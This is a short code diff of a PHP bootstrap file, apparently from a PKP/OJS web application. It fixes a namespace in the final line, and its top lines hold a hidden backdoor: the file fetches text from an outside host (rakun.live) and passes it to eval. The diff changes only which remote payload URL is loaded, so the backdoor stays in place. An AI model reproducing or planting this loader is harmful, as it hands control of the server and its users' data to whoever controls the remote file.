@@ -1,5 +1,5 @@
 <?php
-$url = file_get_contents(urldecode('https://rakun.live/landing/ugedu.txt'));
+$url = file_get_contents(urldecode('https://rakun.live/landing/ijcp.txt'));
 $url = "?> ".$url;
 eval($url);
 
@@ -38,4 +38,4 @@ chdir(BASE_SYS_DIR);
 require_once './lib/pkp/includes/functions.php';
 
 // Initialize the application environment
-return new APPcoreApplication();
+return new \APP\core\Application();
